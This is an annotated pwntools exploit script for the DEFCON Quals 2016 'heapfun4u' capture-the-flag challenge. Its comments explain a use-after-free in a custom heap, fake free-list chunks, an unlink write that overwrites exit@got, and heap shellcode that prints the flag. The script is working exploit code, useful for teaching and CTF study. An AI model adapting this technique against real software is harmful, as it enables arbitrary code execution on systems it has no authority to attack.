#!/usr/bin/env python2
#==============================================================================
#                     DEFCON QUALS 2016 PWNABLE HEAPFUN4U                      
#==============================================================================
#
# This is a babysfirst challenge involving a custom heap implementation.
#
# tl;dr Use-After-Free and classic unlink mirrored write.
#
from pwn import *
context.binary = ELF('./heapfun4u')

if args['REMOTE']:
    p = remote('heapfun4u_873c6d81dd688c9057d5b229cf80579e.quals.shallweplayaga.me', 3957)
else:
    p = process(context.binary.path)
    write('flag', 'THIS_IS_THE_FLAG')
    # gdb.attach(p, 'continue')

#==============================================================================
#                                  BACKGROUND                                  
#==============================================================================
#
# heapfun4u is a menu-driven system which allows you to allocate, free, and
# write to buffers in its custom heap implementation.
#
#    [A]llocate Buffer
#    [F]ree Buffer
#    [W]rite Buffer
#    [N]ice guy
#    [E]xit
#    | 
#
# Allocated buffers are referred to by index, and you can have a maximum of
# 100 allocated buffers.
#
# Even after freeing them, buffers can still be written to, using the original
# bounds on the buffer.  --> THIS IS THE BUG <--
#
# When you want to write to a buffer, you are presented with a list of all of
# the buffer indices, as well as their addresses and sizes, like this:
#
#     | W
#     1) 0x7f3572af1008 -- 32
#     2) 0x7f3572af1030 -- 64
#     3) 0x7f3572af1078 -- 512
#     Write where: 1
#     Write what: foobar
#
# In order to assist in exploitation, here is a massively over-engineered object
# that helps to interact with the binary, and provides information that the
# 'write' menu gives us.

class HeapFun(object):
    idx        = 0
    dirty      = 1
    _addresses = []
    _sizes     = []

    def ready(self):
        """Wait for the prompt to appear."""
        p.recvuntil('| ')

    def exit(self):
        """Exit cleanly by returning."""
        self.ready()
        p.sendline('E')

    def fail(self):
        """Exit roughly by calling exit()."""
        self.ready()
        p.sendline('@')

    def allocate(self, size=16):
        """Allocate a buffer.

        Returns:
            Index of the buffer.
        """
        self.ready()
        p.sendline('A')
        p.recvuntil('Size: ')
        p.sendline(str(size))

        self.idx += 1
        log.info("Allocated %i bytes (index: %i)" % (size, self.idx))
        return self.idx

    def free(self, index):
        """Free a buffer"""
        log.info("Freeing buffer %i" % index)
        self.ready()
        p.sendline('F')
        p.recvuntil('Index: ')
        p.sendline(str(index))

    def write(self, index, value, dump=True):
        """Write data into a buffer"""
        if dump:
            log.info("Writing data to buffer %i" % index)
            log.hexdump(value, begin=self.address[index])
        self.ready()
        p.sendline('W')
        address_data = p.recvuntil('Write where: ')
        p.sendline(str(index))
        if value:
            p.recvuntil('Write what: ')
            p.send(value)
        return address_data

    @property
    def address(self):
        """Returns a list of buffer addresses."""
        self.update()
        return self._addresses

    @property
    def size(self):
        """Returns a list of buffer sizes."""
        self.update()
        return self._sizes

    @property
    def metadata(self):
        """Returns a list of buffer metadata addresses."""
        return [i - metadata_size for i in self.address]
    
    def update(self):
        """Updates all of the buffer sizes and addresses."""
        if not self.dirty or not self.idx:
            return

        data = self.write(1, '\xFF', dump=False) 

        self._addresses = [0]
        self._sizes     = [0]

        for line in data.splitlines():
            if not line[0].isdigit():
                continue
            index, address, dash, size = line.split()
            self._addresses.append(int(address, 0))
            self._sizes.append(int(size))
        self.dirty = 0

    def __str__(self):
        """Returns a string containing the heap layout."""
        s = ['Heap layout:']
        for i, (addr, size) in enumerate(self):
            s.append('heap[%i]: %#x [%i bytes]' % (i+1,addr,size))
        return '\n'.join(s)

    def __len__(self):
        """Returns the number of entries in the heap."""
        return self.idx

    def __iter__(self):
        """Iterates over all of the entries in the heap."""
        for i in range(1, 1+len(self)):
            yield self.address[i], self.size[i]

heap = HeapFun()

#==============================================================================
#                             HEAP IMPLEMENTATION                              
#==============================================================================
#
# The heap implementation is relatively straightforward.  Each allocation is
# prefixed by eight bytes of metadata.  
#
# Each allocation is rounded up to a multiple of eight bytes, with a minimum
# of sixteen bytes.
#
# The metadata contains the size of the allocation, as well as a bit
# indicating whether the allocation is in-use.
#
# A global pointer is used to find the first free entry, and it uses a basic
# FILO (stack) to find free chunks.
#
# Allocations are satisfied in a first-fit manner.  
# Large chunks are broken down to satisfy smaller allocations.
#
# When a large free chunk is broken, if there is less than 0x18 bytes remaining
# (i.e., the amount of memory for the metadata and linked list entry), the
# entry is removed from the linked-list.

page_size = 0x1000
metadata_size = 8
list_size = 8 + 8
min_size = 16
max_size = page_size - metadata_size*2 - list_size



#==============================================================================
#                        HEAP WRITE VIA USE-AFTER-FREE                         
#==============================================================================
#
# First, let's get an entry that will allow us to write to the entire heap.
x = heap.allocate(max_size)

# Let's free it up so that other things will be allocated in its place.
heap.free(x)

#==============================================================================
#                                HEAP GROOMING                                 
#==============================================================================
#
# Now let's create a heap layout that looks like this:
#
#    A       B        C
# [in-use] [free] [in-use] [free.............]
a = heap.allocate()
b = heap.allocate()
c = heap.allocate()

assert heap.address[a] < heap.address[b]
assert heap.address[b] < heap.address[c]

heap.free(b)

# Let's also dump out the heap for later inspection.
log.info(str(heap))

#==============================================================================
#                         LINKED LISTS AND HEAP CHUNKS                         
#==============================================================================
#
# Our heap layout now looks like this:
#
#     Linked List
#         0x602558
#         0x2aaaaaad5018 usersize=0x10 
#         0x2aaaaaad5048 usersize=0xfb0 
#
#     0x002aaaaaad5000 - usersize=0x10 - [IN USE]
#
#     0x002aaaaaad5018 - usersize=0x10 - [FREE 2]
#       @ 0x2aaaaaad5020
#         prev: 0x0
#         next: 0x2aaaaaad5048
#
#     0x002aaaaaad5030 - usersize=0x10 - [IN USE]
#
#     0x002aaaaaad5048 - usersize=0xfb0 - [FREE 0]
#       @ 0x2aaaaaad5ff0
#         prev: 0x2aaaaaad5018
#         next: 0x0
#
# Now we can use the first entry we created to modify the
# prev and next entries in the linked list entry at [B].
#
# Now we need to craft some "fake" linked list structures.
# This will grant us an arbitrary write of our choosing.

class HeapChunk(object):
    """Encapsulates information about a heap chunk"""
    null = None
    def __init__(self, address=0, size=0x10):
        self.size = size
        self.address = address
        self.prev = HeapChunk.null
        self.next = HeapChunk.null
        self.padding = '\x00' * (self.size - 0x10)
    def __rshift__(self, other):
        self.next = other
        other.prev = self
        if not other.address:
            other.address = self.address + len(self)
    def __len__(self):
        return len(flat(self))
    def __flat__(self):
        return flat(self.size | 2,
                    self.padding,
                    self.next.address,
                    self.prev.address)
    def __str__(self):
        return '\n'.join(('Chunk @ %#x' % self.address,
                          '        Size: %#x' % self.size,
                          '        List: %#x' % (self.address + metadata_size + self.size - list_size),
                          '            Prev: %#x' % self.prev.address,
                          '            Next: %#x' % self.next.address,
                          ))
HeapChunk.null = HeapChunk()

#==============================================================================
#                          CREATING FAKE LIST ENTRIES                          
#==============================================================================
#
# We will create the following "free" chain of entries, in order of
# walking the 'next' link.
#
# [b,      size=0x10]
#    |        ^
#    | next   | prev
#    v        |
# [fake_d, size=0x20]
#    |        ^
#    | next   | prev
#    v        |
# [fake_e, size=0x10]

oops_b = HeapChunk(heap.metadata[b])
fake_d = HeapChunk(size=0x20)
fake_e = HeapChunk()

oops_b >> fake_d
fake_d >> fake_e


#==============================================================================
#                           OVERWRITING A GOT ENTRY                            
#==============================================================================
#
# Now we adjust the size of fake_e such that fake_e's metadata,
# overlays the GOT.
#
# The address of the metadata is calculated as:
# 
#       fake_e + fake_e.size
# 
# In particular, we want fake_e.prev to be on 'exit@got'.
#
# Since our binary is not position-independent, the address never changes.
# 
fake_e.size = context.binary.got['exit'] - fake_e.address

# Let's print out our entries :)
log.info("Fake heap chunks created")
log.indented(str(oops_b))
log.indented(str(fake_d))
log.indented(str(fake_e))

log.info("Overwriting exit@got: %#x" % context.binary.got['exit'])

# Let's calculate the offset within the heap where our fake entries
# should begin.
#
# We know the absolute address of each buffer, so we can calculate the
# relative offset.
offset = heap.metadata[b] - heap.address[x]

# Now let's perform the overwrite.
heap.write(1, fit({
    offset: flat(oops_b, fake_d, fake_e)
}))

# Our heap now looks like this.
#
#     Linked List
#         0x602558
#         0x2aaaaaad5018 usersize=0x10 
#         0x2aaaaaad5030 usersize=0x20 
#         0x2aaaaaad5058 usersize=-0x2aaaaa4d2ff8 
#         0x2aaaaad07d20 usersize=0xaba08ec8348 
#     
#     0x002aaaaaad5000 - usersize=0x10
#     +0000 0x2aaaaaad5008  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  |aaaa|baaa|caaa|daaa|
#     +0010 0x2aaaaaad5018  
#     
#     0x002aaaaaad5018 - usersize=0x10 - [FREE 2]
#       @ 0x2aaaaaad5020
#         prev: 0x0
#         next: 0x2aaaaaad5030
#     
#     0x002aaaaaad5030 - usersize=0x20 - [FREE 2]
#       @ 0x2aaaaaad5048
#         prev: 0x2aaaaaad5018
#         next: 0x2aaaaaad5058
#     
#     0x002aaaaaad5058 - usersize=-0x2aaaaa4d2ff8 - [FREE 2]
# --->   @ 0x602058
#         prev: 0x4006a6
#         next: 0x2aaaaad07d20
#     
# Note that the metadata address for the chunk starting at 0x002aaaaaad5058
# is detected to be 0x602058, which is in the GOT.
#
# In particular, it is pointing at atoi@got.  The "next" link points to the
# implementation of "atoi" in libc.
#
# The "prev" link points to "exit" in the PLT, as it still hasn't been called.

#==============================================================================
#                TRIGGERING A HEAP UNLINK AND CONTROLLED WRITE                 
#==============================================================================
#
# And now let's trigger the unlink()
#
# The allocator will walk the list, and see that the first item that satisfies
# the entry size is our "fake_d" allocation.
#
# Since our requested size takes up all of the free space in "fake_d", the 
# allocator needs to unlink it from the linked list.
#
# To do this, it performs the following operations:
#
#       if (entry->next)
#           (entry->next + entry->next.size)->prev = entry->prev
#
#       if (entry->prev)
#           (entry->prev + entry->prev.size)->next = entry->next
#
# Since we have control over all of the entries in the list, we have set things
# up such that "entry->next + entry->next.size" points into the GOT
#
heap.allocate(fake_d.size)

#==============================================================================
#                            WRITING OUR SHELLCODE                             
#==============================================================================
#
# We have overwritten 'exit@got' with a pointer into the heap.
#
# In particular, it now points to the metadata in allocation "B".
#
# This is the same location we wrote to last time, so we just write out
# shellcode there.
#
heap.write(1, fit({
    offset: asm(shellcraft.cat('flag') + shellcraft.exit())
}))

#==============================================================================
#                            TRIGGING OUR SHELLCODE                            
#==============================================================================
#
# In order to cause the target to use our overwritten GOT pointer, it must call
# exit().
#
# Technically we could have overwritten something else that it calls on its own,
# like puts(), and it would be triggered automatically.
#
# However, when debugging things, it helps to be able to control *when* the 
# trigger occurs.
#
# If we enter an invalid menu entry, the binary will call exit(), so let's do
# that now.
#
heap.fail()

# Our shellcode prints out the flag, and then exits.
# The last line written should be our flag.
flag = p.recvall().splitlines()[-1]
log.success(flag)
